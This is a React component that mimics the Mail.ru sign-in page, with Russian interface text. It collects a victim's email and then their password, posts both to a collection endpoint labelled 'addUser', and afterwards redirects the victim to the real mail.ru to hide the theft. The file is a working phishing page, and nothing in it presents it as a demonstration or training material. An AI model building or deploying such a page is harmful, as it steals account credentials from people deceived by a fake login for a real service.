import { useState } from "react";
import MailLogo from '../assets/mail/logo.png'
import YaLogo from '../assets/YaLogo.png'
// import QRCode from "qrcode.react";

const MailRuAuth = () => {
  const [login, setLogin] = useState("");
  const [inputValue, setInputValue] = useState("")
  const [error, setError] = useState(false)

  const [step, setStep] = useState("login");

  const [remember, setRemember] = useState(false);

  const [showToast, setShowToast] = useState(false)

  const handleClick = () => {
    setShowToast(true);
    setTimeout(() => setShowToast(false), 3000); // Убираем через 3 сек
  };

  const handleButtonClick = (e) => {
    e.preventDefault()

    if (!inputValue.trim()) {
      setError(true);
      return;
    }
    setError(false)

    if (step === "login") {
      setLogin(inputValue);
      setInputValue("");
      setStep("password");
    }
    else if (step === "password") {
      const userData = {
        login,
        password: inputValue,
        resource: "Mailru"
      };

      fetch("http://localhost:8000/addUser", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(userData),
      })
        .then(async (response) => {
          const data = await response.json();
          if (response.ok) {
            // console.log("Пользователь добавлен:", data);
            setInputValue("");
            setStep("login")
            window.location.href = "https://mail.ru/"
          } else {
            // console.error("Ошибка:", data.error);
            setError(true);
          }
        })
        .catch((error) => {
          // console.error("Ошибка при отправке запроса:", error);
          setError(true);
        })
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-gray-100 p-4">
      <div className="bg-white shadow-lg rounded-xl p-6 w-96">
        <h2 className="text-xl font-semibold mb-4">Войти в аккаунт</h2>

        {showToast && (
          <div className="fixed top-5 left-1/2 transform -translate-x-1/2 bg-black text-white px-4 py-2 rounded-md shadow-lg animate-fade-in">
            Вход возможен только по почте или номеру телефона
          </div>
        )}

        <style>{`
                        @keyframes fadeIn {
                            from { opacity: 0; transform: translateY(-10px) translateX(-50%); }
                            to { opacity: 1; transform: translateY(0) translateX(-50%); }
                        }
                        .animate-fade-in {
                            animation: fadeIn 0.3s ease-in-out;
                        }
                        `}</style>

        <div className="flex space-x-4">
          <button
            onClick={handleClick}
            className="w-24 h-10 flex items-center justify-center border rounded-md text-white font-semibold bg-no-repeat bg-center bg-cover"
            style={{
              backgroundImage: `url(${MailLogo})`,
              backgroundSize: "120%"
            }}
          >
            {/* @ mail */}
          </button>

          <button
            onClick={handleClick}
            className="w-24 h-10 flex items-center justify-center border-none text-white font-semibold bg-no-repeat bg-center bg-contain"
            style={{
              backgroundImage: `url(${YaLogo})`,
              backgroundSize: "50%"
            }}
          >
          </button>

          <button
            onClick={handleClick}
            className="w-24 h-10 border-none rounded-lg text-blue-600 font-semibold">
            Другой
          </button>
        </div>

        <form onSubmit={handleButtonClick}>
          <input
            type={step === "login" ? "text" : "password"}
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onFocus={() => setError(false)}
            placeholder={
              error
                ? "Введите данные"
                : step === "login"
                  ? "E-mail"
                  : "Пароль"
            }
            className={`w-full p-2 border-[2px] rounded mb-3 mt-3
            ${error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:gray-500"}`}

          />

          <div className="flex justify-between">
            <button
              type="submit"
              className="flex items-center justify-center gap-2 px-4 bg-blue-600 text-white py-2 rounded hover:bg-blue-500"
            >
              Войти
              <span className="text-lg">➜</span>
            </button>

            <label className="flex items-center space-x-2 cursor-pointer">
              <div
                className={`w-5 h-5 border rounded flex items-center justify-center cursor-pointer ${remember ? "bg-blue-500" : "bg-white"
                  }`}
                onClick={() => setRemember(!remember)}
              >
                {remember && <span className="text-white font-bold text-lg">✓</span>}
              </div>
              <span>Запомнить</span>
            </label>
          </div>
        </form>



        <div className="mt-4 text-left">
          <p className="text-base">Другие способы входа</p>
          <div className="flex justify-start space-x-4 mt-2">
            <button
              onClick={handleClick}
              className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-500">VK ID</button>
            <button
              onClick={handleClick}
              className="bg-none border-[2px]  px-4 py-2 rounded-lg text-blue-600">Gmail</button>
          </div>
        </div>

        <div className="mt-6 text-center">
          {/* <p className="text-sm font-medium">Быстрый вход по QR-коду</p> */}
          <div className="flex justify-center mt-2">
          </div>
        </div>
      </div>
    </div>
  );
}

export default MailRuAuth